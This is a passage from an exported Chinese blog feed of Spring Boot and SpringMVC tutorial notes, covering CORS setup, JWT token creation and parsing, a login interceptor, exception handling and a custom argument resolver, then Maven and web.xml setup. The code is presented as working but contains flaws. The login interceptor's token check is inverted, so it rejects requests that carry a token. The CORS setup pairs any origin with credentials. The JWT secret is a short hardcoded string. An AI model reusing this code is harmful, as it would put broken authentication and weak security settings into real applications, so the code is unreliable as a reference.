<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserServcie userServcie;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findAll&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">findAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用service查询数据 ，进行返回</span></span><br><span class="line">        List&lt;User&gt; users = userServcie.findAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="2-使用-WebMvcConfigurer-的-addCorsMappings-方法配置CorsInterceptor"><a href="#2-使用-WebMvcConfigurer-的-addCorsMappings-方法配置CorsInterceptor" class="headerlink" title="2.使用 WebMvcConfigurer 的 addCorsMappings 方法配置CorsInterceptor"></a>2.使用 WebMvcConfigurer 的 addCorsMappings 方法配置CorsInterceptor</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 设置允许跨域的路径</span></span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                <span class="comment">// 设置允许跨域请求的域名</span></span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                <span class="comment">// 是否允许cookie</span></span><br><span class="line">                .allowCredentials(<span class="keyword">true</span>)</span><br><span class="line">                <span class="comment">// 设置允许的请求方式</span></span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">                <span class="comment">// 设置允许的header属性</span></span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                <span class="comment">// 跨域允许时间</span></span><br><span class="line">                .maxAge(<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-6-拦截器"><a href="#4-6-拦截器" class="headerlink" title="4.6 拦截器"></a>4.6 拦截器</h3><h4 id="4-6-0-登录案例"><a href="#4-6-0-登录案例" class="headerlink" title="4.6.0 登录案例"></a>4.6.0 登录案例</h4><h5 id="4-6-0-1-思路分析"><a href="#4-6-0-1-思路分析" class="headerlink" title="4.6.0.1 思路分析"></a>4.6.0.1 思路分析</h5><p>​        在前后端分离的场景中，很多时候会采用token的方案进行登录校验。</p>
<p>​        登录成功时，后端会根据一些用户信息生成一个token字符串返回给前端。</p>
<p>​        前端会存储这个token。以后前端发起请求时如果有token就会把token放在请求头中发送给后端。</p>
<p>​        后端接口就可以获取请求头中的token信息进行解析，如果解析不成功说明token超时了或者不是正确的token，相当于是未登录状态。</p>
<p>​        如果解析成功，说明前端是已经登录过的。</p>
<h5 id="4-6-0-2-Token生成方案-JWT"><a href="#4-6-0-2-Token生成方案-JWT" class="headerlink" title="4.6.0.2 Token生成方案-JWT"></a>4.6.0.2 Token生成方案-JWT</h5><p>​        本案例采用目前企业中运用比较多的JWT来生成token。</p>
<p>​        使用时先引入相关依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建utils包,下面新建JwtUtil类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220206224426968.png" alt="image-20220206224426968">        </p>
<p>然后可以使用下面的工具类来生成和解析token,因为是静态方法,直接调用即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtBuilder;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JWT工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有效期为</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Long JWT_TTL = <span class="number">60</span> * <span class="number">60</span> *<span class="number">1000L</span>;<span class="comment">// 60 * 60 *1000  一个小时</span></span><br><span class="line">    <span class="comment">//设置秘钥明文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String JWT_KEY = <span class="string">&quot;sangeng&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ttlMillis</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createJWT</span><span class="params">(String id, String subject, Long ttlMillis)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;</span><br><span class="line">        <span class="keyword">long</span> nowMillis = System.currentTimeMillis();</span><br><span class="line">        Date now = <span class="keyword">new</span> Date(nowMillis);</span><br><span class="line">        <span class="keyword">if</span>(ttlMillis==<span class="keyword">null</span>)&#123;</span><br><span class="line">            ttlMillis=JwtUtil.JWT_TTL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> expMillis = nowMillis + ttlMillis;</span><br><span class="line">        Date expDate = <span class="keyword">new</span> Date(expMillis);</span><br><span class="line">        SecretKey secretKey = generalKey();</span><br><span class="line"></span><br><span class="line">        JwtBuilder builder = Jwts.builder()</span><br><span class="line">                .setId(id)              <span class="comment">//唯一的ID</span></span><br><span class="line">                .setSubject(subject)   <span class="comment">// 主题  可以是JSON数据</span></span><br><span class="line">                .setIssuer(<span class="string">&quot;sg&quot;</span>)     <span class="comment">// 签发者</span></span><br><span class="line">                .setIssuedAt(now)      <span class="comment">// 签发时间</span></span><br><span class="line">                .signWith(signatureAlgorithm, secretKey) <span class="comment">//使用HS256对称加密算法签名, 第二个参数为秘钥</span></span><br><span class="line">                .setExpiration(expDate);<span class="comment">// 设置过期时间</span></span><br><span class="line">        <span class="keyword">return</span> builder.compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成加密后的秘钥 secretKey</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SecretKey <span class="title">generalKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] encodedKey = Base64.getDecoder().decode(JwtUtil.JWT_KEY);</span><br><span class="line">        SecretKey key = <span class="keyword">new</span> SecretKeySpec(encodedKey, <span class="number">0</span>, encodedKey.length, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jwt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parseJWT</span><span class="params">(String jwt)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SecretKey secretKey = generalKey();</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(secretKey)</span><br><span class="line">                .parseClaimsJws(jwt)</span><br><span class="line">                .getBody();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编写拦截器"><a href="#编写拦截器" class="headerlink" title="编写拦截器"></a>编写拦截器</h4><p>以token拦截器为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取请求头中的token</span></span><br><span class="line">        String token = request.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.hasText(token))&#123;</span><br><span class="line"></span><br><span class="line">            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Claims claims = JwtUtil.parseJWT(token);</span><br><span class="line">            String subject=claims.getSubject();</span><br><span class="line">            System.out.println(subject);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//解析token,判断是否成功</span></span><br><span class="line">        <span class="comment">//如果解析过程没有异常,说明是已登录状态</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h4><p>在config包下新建拦截器配置类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220206235455580.png" alt="image-20220206235455580"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginInterceptor loginInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(loginInterceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">                <span class="comment">//.excludePathPatterns();//配置排除路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-7-异常统一处理"><a href="#4-7-异常统一处理" class="headerlink" title="4.7 异常统一处理"></a>4.7 异常统一处理</h3><h4 id="①创建类加上-ControllerAdvice注解进行标识"><a href="#①创建类加上-ControllerAdvice注解进行标识" class="headerlink" title="①创建类加上@ControllerAdvice注解进行标识"></a>①创建类加上@ControllerAdvice注解进行标识</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyControllerAdvice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②定义异常处理方法"><a href="#②定义异常处理方法" class="headerlink" title="②定义异常处理方法"></a>②定义异常处理方法</h4><p>​    定义异常处理方法，使用**@ExceptionHandler**标识可以处理的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyControllerAdvice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">handlerException</span><span class="params">(Exception e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取异常信息，存放如ResponseResult的msg属性</span></span><br><span class="line">        String message = e.getMessage();</span><br><span class="line">        ResponseResult result = <span class="keyword">new</span> ResponseResult(<span class="number">300</span>,message);</span><br><span class="line">        <span class="comment">//把ResponseResult作为返回值返回，要求到时候转换成json存入响应体中</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="4-8-获取web原生对象"><a href="#4-8-获取web原生对象" class="headerlink" title="4.8 获取web原生对象"></a>4.8 获取web原生对象</h3><p>​    我们之前在web阶段我们经常要使用到request对象，response，session对象等。我们也可以通过SpringMVC获取到这些对象。（不过在MVC中我们很少获取这些对象，因为有更简便的方式，避免了我们使用这些原生对象相对繁琐的API。）</p>
<p>​    我们只需要在方法上添加对应类型的参数即可，但是注意数据类型不要写错了，SpringMVC会把我们需要的对象传给我们的形参。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getRequestAndResponse&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">getRequestAndResponse</span><span class="params">(HttpServletRequest request, HttpServletResponse response, HttpSession session)</span></span>&#123;</span><br><span class="line">        System.out.println(request);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-9-自定义参数解析"><a href="#4-9-自定义参数解析" class="headerlink" title="4.9 自定义参数解析"></a>4.9 自定义参数解析</h3><p>​    如果我们想实现像获取请求体中的数据那样，在Handler方法的参数上增加一个@RepuestBody注解就可以获取到对应的数据的话。</p>
<p>​    可以使用HandlerMethodArgumentResolver来实现自定义的参数解析。</p>
<p>①定义用来标识的注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.PARAMETER)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CurrentUserId &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②创建类实现HandlerMethodArgumentResolver接口并重写其中的方法</p>
<p><strong>注意加上@Component注解注入Spring容器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserIdArgumentResolver</span> <span class="keyword">implements</span> <span class="title">HandlerMethodArgumentResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断方法参数使用能使用当前的参数解析器进行解析</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supportsParameter</span><span class="params">(MethodParameter parameter)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果方法参数有加上CurrentUserId注解，就能把被我们的解析器解析</span></span><br><span class="line">        <span class="keyword">return</span> parameter.hasParameterAnnotation(CurrentUserId.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进行参数解析的方法，可以在方法中获取对应的数据，然后把数据作为返回值返回。方法的返回值就会赋值给对应的方法参数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">resolveArgument</span><span class="params">(MethodParameter parameter, ModelAndViewContainer mavContainer, NativeWebRequest webRequest, WebDataBinderFactory binderFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取请求头中的token</span></span><br><span class="line">        String token = webRequest.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.hasText(token))&#123;</span><br><span class="line">            <span class="comment">//解析token，获取userId</span></span><br><span class="line">            Claims claims = JwtUtil.parseJWT(token);</span><br><span class="line">            String userId = claims.getSubject();</span><br><span class="line">            <span class="comment">//返回结果</span></span><br><span class="line">            <span class="keyword">return</span> userId;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③配置参数解析器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArgumentResolverConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserIdArgumentResolver userIdArgumentResolver;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addArgumentResolvers</span><span class="params">(List&lt;HandlerMethodArgumentResolver&gt; resolvers)</span> </span>&#123;</span><br><span class="line">        resolvers.add(userIdArgumentResolver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>④测试</p>
<p>在需要获取UserId的方法中增加对应的方法参数然后使用@CurrentUserId进行标识即可获取到数据,这个非常好用,每次只需要添加注解就能获取token中的值并赋值给其后面的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="comment">//@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserServcie userServcie;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findAll&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">findAll</span><span class="params">(<span class="meta">@CurrentUserId</span> String userId)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(userId);</span><br><span class="line">        <span class="comment">//调用service查询数据 ，进行返回s</span></span><br><span class="line">        List&lt;User&gt; users = userServcie.findAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC入门</title>
    <url>/2022/01/28/SpringMVC%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="SpringMVC入门学习"><a href="#SpringMVC入门学习" class="headerlink" title="SpringMVC入门学习"></a>SpringMVC入门学习<span id="more"></span></h1><h3 id="SpringMVC开发步骤"><a href="#SpringMVC开发步骤" class="headerlink" title="SpringMVC开发步骤"></a>SpringMVC开发步骤</h3><p>在maven中导入需要的依赖(环境是tomcat9)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--springMvc依赖,和spring-web版本号需要保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--spring-context依赖,和上面版本保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--servlet依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mysql依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h5><p>需求:客户端发起请求,服务端接收请求,执行逻辑并进行视图跳转</p>
<p>springMVC开发步骤:</p>
<ul>
<li>导入SpringMVC相关坐标</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>web.xml配置SpringMVC核心控制器DispathcerServlet</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span><span class="comment">&lt;!--代表服务器启动时候就加载调度员对象--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建Controller类和视图页面</li>
<li>使用注解配置Controller类中业务方法的映射地址</li>
</ul>
